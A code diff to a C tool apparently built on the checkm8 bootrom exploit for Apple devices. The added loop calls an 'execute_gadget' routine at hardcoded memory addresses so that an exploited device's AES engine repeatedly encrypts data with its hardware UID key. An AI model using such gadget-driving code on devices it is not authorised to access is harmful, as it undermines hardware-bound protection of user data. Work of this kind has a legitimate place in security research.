@@ -1,11 +1,17 @@
 #include "checkm8.h"
-#include "payload.h"
 
 #include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+
+#include "usb_helpers.h"
+#include "command.h"
+#include "payload.h"
+
+#ifdef CHECKM8_LOGGING
 #include <stdarg.h>
 #include <execinfo.h>
-#include <usb_helpers.h>
-#include "command.h"
+#endif
 
 void checkm8_debug_indent(const char *format, ...)
 {
@@ -47,7 +53,63 @@ int main()
         return -1;
     }
 
+    unsigned long long data0 = 0xdeadbeefdeadbeef;
+    unsigned long long data1 = 0xdeadbeefdeadbeef;
 
-    free_dev_cmd_resp(resp);
+    ret = open_device_session(dev);
+    if(IS_CHECKM8_FAIL(ret))
+    {
+        printf("failed to open device session\n");
+        return -1;
+    }
+
+    for(int i = 0; i < 100000; i++)
+    {
+        printf("encrypting ");
+        for(int j = 0; j < 8; j++)
+        {
+            printf("%02X", ((unsigned char *) &data0)[j]);
+        }
+
+        for(int j = 0; j < 8; j++)
+        {
+            printf("%02X", ((unsigned char *) &data1)[j]);
+        }
+
+        printf("\n");
+        resp = execute_gadget(dev,
+                              0x100000f0c, 16, 9,
+                              16, // action (AES_ENCRYPT)
+                              0x1800b0048, 0x1800b0010, // dest and src addresses
+                              16, // data size
+                              0x20000201, // AES_UID_KEY
+                              0, 0, // no
+                              data0, data1);
+
+        if(IS_CHECKM8_FAIL(resp->ret))
+        {
+            printf("failed\n");
+            return -1;
+        }
+
+        memcpy(&data0, &resp->data[0], 8);
+        memcpy(&data1, &resp->data[8], 8);
+        free_dev_cmd_resp(resp);
+
+        printf("\t-> ");
+        for(int j = 0; j < 8; j++)
+        {
+            printf("%02X", ((unsigned char *) &data0)[j]);
+        }
+
+        for(int j = 0; j < 8; j++)
+        {
+            printf("%02X", ((unsigned char *) &data1)[j]);
+        }
+        printf("\n");
+        usleep(250000);
+    }
+
+    close_device_session(dev);
     free_device(dev);
 }
